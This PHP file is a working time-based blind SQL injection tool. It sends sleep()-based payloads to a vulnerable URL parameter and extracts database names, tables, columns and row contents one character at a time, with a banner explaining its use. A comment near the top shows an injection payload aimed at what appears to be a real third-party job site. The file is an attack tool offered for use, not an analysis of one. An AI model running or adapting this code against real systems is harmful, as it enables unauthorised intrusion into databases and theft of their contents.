<?php
// Timeout in seconds
//ob_end_clean();
//check to confirm if db exist:
//http://aiejob.com/companyProfile.php?cid=8 AND if((select database())="aiejob_database",sleep(100),"No")-- -
ob_start();
session_start();
function timebase($host,$vul,$db,$timeout,$query,$j,$i) {
      $data='';
    //$ok=$_SESSION['counter'];
    $payload = urlencode(" $query");
    echo $vul = $vul . $payload;

    $fp = fsockopen($host, 80, $errno, $errstr, $timeout);

    if ($fp) {
        $time_start = microtime(true);
        fwrite($fp, "GET /$vul HTTP/1.0\r\n");
        fwrite($fp, "Host: $host\r\n");
        fwrite($fp, "Connection: Close\r\n\r\n");

        stream_set_blocking($fp, TRUE);
        stream_set_timeout($fp, $timeout);
        $info = stream_get_meta_data($fp);

        while ((!feof($fp)) && (!$info['timed_out'])) {
            $data .= fgets($fp, 4096);
            $info = stream_get_meta_data($fp);
            ob_flush();
            flush();
        }

     if ($info['timed_out']) {

            echo "Connection Timed Out!";
        } else {
          //  echo $data;
        }

        $time_end = microtime(true);
        $time = $time_end - $time_start;
    }
    echo "<br>";
    echo "<br>";
    echo "time total time is :" . ceil($time).'<br>'."$j ".'Char is :'.$db;
    echo "<br>";
    echo "<br>";
    //if ($time >=20) {
    if ($time >=$timeout) {
        echo "[On the $i th iteration when j is $j ]<br>";
        echo "Vul to TIME BASED SQL INJECTION:";
        echo "<br>";
        echo "<br>";
        echo "char: $db";
        echo "<br>";
        echo "<br>";
      return true;
    }else {
        return false;
    }
}

function find($host,$vul,$timeout,$str,$th3gentleM3n,$half_query,$i,$action)
{
    for ($k = 1; $k; $k++) {

        for ($j = 0, $counter = 0; $j <= 93; $j++) {
            $db = chr(($j + 33));

                $query = "AND if((select substr(($half_query limit $i,1),$k,1))='$db',sleep($timeout),'No')-- -";


            $TheTime = timebase($host, $vul, $db, $timeout, $query, $j, $k);

            if ($TheTime) {
                $str .= $db;
                $counter = 1;
                break;
                // echo "the counter is : " . $counter . " while i is $i and J is $j" . "<br>";
            }

            /*   if ((($j == 93) && ($counter == 0)) && ($k != 1)) {
                   $th3gentleM3n = 1;
                   //echo "the gendtlemen got triggered and has now become " . $th3gentleM3n;
                   //echo "<br>" . "the counter is got zeroed" . "while i is $i and J is $j" . "<br>";
               }*/
            if ((($j == 93) && ($counter == 0))&&($k!=1)) {
                $th3gentleM3n = 1;

            }

            if ((($j == 93) && ($counter == 0))&&($k!=1)) {
                $th3gentleM3n = 1;

            }

            if ($j == 31) {
                $j = 58;
            }

        }


        if ($th3gentleM3n == 1) {
            // ob_end_clean();
          //  echo "<br>" . "$i 's Table:" . "<br>";
            break;
        }

    }

   // $arr1 = explode('/', $str);
    //print_r($arr1);
    // echo $arr;
    if ($str) {

        return $str;
    }else{
        return false;
    }


}




if(isset($_GET['host'])&&($_GET['vul'])&&($_GET['timeout'])&&($_GET['action'])) {
    if ($_GET['action'] == "db") {
        $host = $_GET['host'];
        $vul = $_GET['vul'];
        $timeoutvalue = $_GET['timeout'];
        $action=$_GET['action'];
        $timeout = $timeoutvalue;
        $str = '';
        $i=0;
        $th3gentleM3n = 0;
        $Outerth3gentleM3n = 0;
        $half_query="select schema_name FROM INFORMATION_SCHEMA.SCHEMATA";
        while(true) {

            $result=find($host, $vul, $timeout, $str, $th3gentleM3n,$half_query,$i,$action);

            if($result==false) {
                echo "<br>"."Scanning Finished"."<br>" ."Database found:"."<br>";
                break;
            }else{
                $arr[$i]=$result;
                $i++;
            }
        }
        foreach ($arr as $table){
            echo $table."<br>";
        }
    }
    else if ($_GET['action'] == "tables") {
        $host = $_GET['host'];
        $vul = $_GET['vul'];
        $timeoutvalue = $_GET['timeout'];
        $action=$_GET['action'];
        $timeout = $timeoutvalue;
        $database="0x".bin2hex($_GET['db']);
        $str = '';
        $i=0;
        $th3gentleM3n = 0;
        $Outerth3gentleM3n = 0;
        $half_query="select table_name from information_schema.tables where table_schema=$database";
        while(true) {

            $result=find($host, $vul, $timeout, $str, $th3gentleM3n,$half_query,$i,$action);

            if($result==false) {
                echo "<br>"."Scanning Finished"."<br>" ."Tables found:"."<br>";
                break;
            }else{
                $arr[$i]=$result;
               $i++;
            }
        }
       foreach ($arr as $table){
           echo $table."<br>";
       }
    }else if ($_GET['action'] == "columns") {
        $host = $_GET['host'];
        $vul = $_GET['vul'];
        $timeoutvalue = $_GET['timeout'];
        $table_name="0x".bin2hex($_GET['table_name']);
        //$timeout = 20;
        $timeout = $timeoutvalue;
        $str = '';
        $i=0;
        $action=$_GET['action'];
        $th3gentleM3n = 0;
        $Outerth3gentleM3n = 0;
        $half_query="select column_name from information_schema.columns where table_name=$table_name";
        while(true) {

            $result=find($host, $vul, $timeout, $str, $th3gentleM3n,$half_query,$i,$action);

            if($result==false) {
                echo "<br>"."Scanning Finished"."<br>" ."Columns found:"."<br>";
                break;
            }else{
                $columns[$i]=$result;
                $i++;
            }
        }
        foreach ($columns as $column){
            echo $column."<br>";
        }
    } else if ($_GET['action'] == "dump") {
        $host = $_GET['host'];
        $vul = $_GET['vul'];
        $timeoutvalue = $_GET['timeout'];
        $table_name=$_GET['table_name'];
        $column_name=$_GET['column_name'];
        //$timeout = 20;
        $timeout = $timeoutvalue;
        $str = '';
        $i=0;
        $action=$_GET['action'];
        $th3gentleM3n = 0;
        $Outerth3gentleM3n = 0;
        $half_query="select $column_name from $table_name";
        while(true) {

            $result=find($host, $vul, $timeout, $str, $th3gentleM3n,$half_query,$i,$action);

            if($result==false) {
                echo "<br>"."Scanning Finished"."<br>" ."Data found:"."<br>";
                break;
            }else{
                $data[$i]=$result;
                $i++;
            }
        }
        foreach ($data as $plaintext){
            echo $plaintext."<br>";
        }
    }
    
}
else{

    echo "<pre>";
    echo "===============================================================================================================================================";
    echo "<br>";
    echo "=                                                                                                                                             =";
    echo "<br>";
    echo "=                                       Welcome...!!                                                                                          =";
    echo "<br>";
    echo "=                                                                                                                                             =";
    echo "<br>";
    echo "=                         to the time Base SQLI Script, Created By Umair                                                                      =";
    echo "<br>";
    echo "=                                                                                                                                             =";
    echo "<br>";
    echo "=          For DB:inject.php?host=localhost&vul=localhost.php?id=1&timeout=10&action=db                                                      =";
    echo "<br>";
    echo "<br>";
    echo "=          For Tables:inject.php?host=localhost&vul=localhost.php?id=1&timeout=10&db=test&action=tables                                      =";
    echo "<br>";
    echo "<br>";
    echo "=          For Table_names:inject.php?host=localhost&vul=localhost.php?id=1&timeout=10&table_name=ad&action=columns                          =";
    echo "<br>";
    echo "<br>";
    echo "=          For Columns:inject.php?host=localhost&vul=localhost.php?id=1&timeout=10&table_name=ad&action=columns                              =";
    echo "<br>";
    echo "<br>";
    echo "=          For Dump data:inject.php?host=localhost&vul=localhost.php?id=1&timeout=10&table_name=ad&column_name=umair&action=dump             =";
    echo "<br>";
    echo "===============================================================================================================================================";
}
 ?>